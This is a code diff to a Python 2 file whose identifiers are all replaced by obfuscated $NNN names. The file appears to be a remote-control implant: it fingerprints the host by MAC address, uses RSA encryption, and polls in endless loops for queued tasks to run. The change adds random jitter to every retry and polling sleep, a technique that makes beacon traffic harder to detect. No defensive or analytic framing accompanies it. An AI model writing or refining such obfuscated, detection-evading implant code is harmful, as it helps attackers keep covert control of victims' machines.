@@ -9,6 +9,7 @@ import zlib as $007
 import zipfile as $008
 import StringIO as $009
 import xxhash as $010
+import random as $175
 from uuid import getnode as $156
 from Crypto.PublicKey import RSA as $011
 from Crypto.Cipher import PKCS1_OAEP as $012
@@ -34,6 +35,7 @@ class $103:
 		$014.$143 = $006.Queue()
 		$014.$104()
 		$014.$118($014.$136)
+		$175.seed()
 
 	def $104($015):
 		$017 = str($156()) + $015.$125()
@@ -124,6 +126,9 @@ class $103:
 	def $127($052, $053):
 		$052.$139 = $052.$129($053)
 		return
+
+	def $176($177):
+		return $175.randint($177.$138, $177.$138 + $177.$138)
 
 	def $128($054, $055):
 		$056 = 0
@@ -235,11 +240,11 @@ def $153(**$095):
 			if $096 is not None:
 				$150($096)
 			else:
-				$157 = $003.time() + ":" + $095[$144.$124()]
+				$157 = str($003.time()) + ":" + str($095[$144.$124()])
 				$150($157)
 			return
 		except:
-			$003.sleep($144.$138)
+			$003.sleep($144.$176())
 
 def $154():
 	while not $144.$143.empty():
@@ -260,12 +265,12 @@ while True:
 		$147()
 		break
 	except:
-		$003.sleep($144.$138)
+		$003.sleep($144.$176())
 while True:
 	if $144.$143.empty():
 		$100 = $148()
 		if $100 == None:
-			$003.sleep($144.$138)
+			$003.sleep($144.$176())
 			continue
 		for $101 in $100:
 			$144.$143.put($101)
@@ -276,4 +281,4 @@ while True:
 				$149()
 				break
 			except:
-				$003.sleep($144.$138)
+				$003.sleep($144.$176())
